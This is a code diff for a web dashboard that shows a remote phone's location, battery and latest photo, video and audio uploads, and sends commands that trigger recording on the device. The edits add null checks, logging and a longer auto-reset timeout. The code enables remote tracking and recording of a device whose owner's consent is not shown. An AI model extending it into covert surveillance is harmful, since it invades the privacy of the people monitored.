@@ -198,8 +198,19 @@ function loadDeviceData(deviceUid) {
 function initializeTelemetryStream(uid) {
     const statusRef = ref(database, `devices/${uid}/status`);
     const listener = onValue(statusRef, (snapshot) => {
-        if (!snapshot.exists()) return;
+        // ✅ FIXED: Handle when status node doesn't exist yet
+        if (!snapshot.exists()) {
+            console.warn("⚠️ Status node not yet created for device:", uid);
+            return;
+        }
         const data = snapshot.val();
+
+        console.log('📡 Received telemetry data:', {
+            battery: data.batteryPercentage,
+            last_photo_url: data.last_photo_url,
+            last_video_url: data.last_video_url,
+            last_audio_url: data.last_audio_url
+        });
 
         // Battery Level
         if (document.getElementById('battery-text')) {
@@ -219,46 +230,53 @@ function initializeTelemetryStream(uid) {
             if (mapLink) mapLink.href = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
         }
 
-        // ✅ FIXED: Listen for Image Updates (Matches Android DB path)
+        // ✅ FIXED: Listen for Photo/Camera Updates
         if (data.last_photo_url) {
             const img = document.getElementById('cameraPreviewFrame');
             const placeholder = document.getElementById('cameraPlaceholderText');
             if (img && placeholder) {
+                console.log('📸 Updating camera preview:', data.last_photo_url);
                 placeholder.style.display = "none";
                 img.style.display = "block";
                 img.src = data.last_photo_url + "?t=" + Date.now(); // Cache buster
             }
         }
 
-        // ✅ NEW: Listen for Video Updates
+        // ✅ FIXED: Listen for Video Updates
         if (data.last_video_url) {
+            console.log('🎬 Updating video preview:', data.last_video_url);
             let videoContainer = document.getElementById('video-preview-container');
             if (!videoContainer) {
                 videoContainer = document.createElement('div');
                 videoContainer.id = 'video-preview-container';
                 videoContainer.style.marginTop = "15px";
                 videoContainer.innerHTML = `<video controls style="width:100%; border-radius:6px; border:1px solid var(--border-color);"></video>`;
-                document.querySelector('.viewport-canvas-wrapper').after(videoContainer);
+                
+                const wrapper = document.querySelector('.viewport-canvas-wrapper');
+                if (wrapper) wrapper.after(videoContainer);
             }
             const videoEl = videoContainer.querySelector('video');
-            if (videoEl.src !== data.last_video_url) {
+            if (videoEl && videoEl.src !== data.last_video_url) {
                 videoEl.src = data.last_video_url;
                 videoEl.load();
             }
         }
 
-        // ✅ NEW: Listen for Audio Updates
+        // ✅ FIXED: Listen for Audio Updates
         if (data.last_audio_url) {
+            console.log('🎵 Updating audio preview:', data.last_audio_url);
             let audioContainer = document.getElementById('audio-preview-container');
             if (!audioContainer) {
                 audioContainer = document.createElement('div');
                 audioContainer.id = 'audio-preview-container';
                 audioContainer.style.marginTop = "15px";
                 audioContainer.innerHTML = `<audio controls style="width:100%; border-radius:6px; border:1px solid var(--border-color);"></audio>`;
-                document.querySelector('.viewport-canvas-wrapper').after(audioContainer);
+                
+                const wrapper = document.querySelector('.viewport-canvas-wrapper');
+                if (wrapper) wrapper.after(audioContainer);
             }
             const audioEl = audioContainer.querySelector('audio');
-            if (audioEl.src !== data.last_audio_url) {
+            if (audioEl && audioEl.src !== data.last_audio_url) {
                 audioEl.src = data.last_audio_url;
                 audioEl.load();
             }
@@ -348,8 +366,10 @@ function setupCommandListeners(deviceUid) {
                 // Update UI immediately based on local state
                 toggleButtonVisualState(btnId, newState);
 
-                // ✅ AUTO-RESET LOGIC: If turning ON, auto-send FALSE after 3 seconds
-                // This ensures the phone doesn't get stuck if it fails to reset itself
+                console.log(`🎬 Trigger activated: ${dbKey} = ${newState}`);
+
+                // ✅ AUTO-RESET LOGIC: If turning ON, auto-send FALSE after 15 seconds
+                // ⏱️ INCREASED TIMEOUT: Gives the phone enough time to record and upload
                 if (newState) {
                     setTimeout(() => {
                         // Only reset if user hasn't clicked again in the meantime
@@ -359,7 +379,7 @@ function setupCommandListeners(deviceUid) {
                             toggleButtonVisualState(btnId, false);
                             console.log(`⏱️ Auto-reset trigger: ${dbKey}`);
                         }
-                    }, 3000); 
+                    }, 15000); // ✅ CHANGED from 3000ms to 15000ms (15 seconds)
                 }
             };
         }
@@ -368,6 +388,7 @@ function setupCommandListeners(deviceUid) {
     // 3. TIME SETTER
     document.getElementById('time-setter')?.addEventListener('change', (e) => {
         if (e.target.value) {
+            console.log('⏰ Setting activation time:', e.target.value);
             sendRemoteCommand(deviceUid, 'activation_time', e.target.value);
         }
     });
@@ -377,6 +398,7 @@ function setupCommandListeners(deviceUid) {
 // UTILITIES
 // ==========================================
 function sendRemoteCommand(deviceUid, commandName, value) {
+    console.log(`📤 Sending command: ${commandName} = ${value}`);
     update(ref(database, `devices/${deviceUid}/commands`), { [commandName]: value });
 }
 
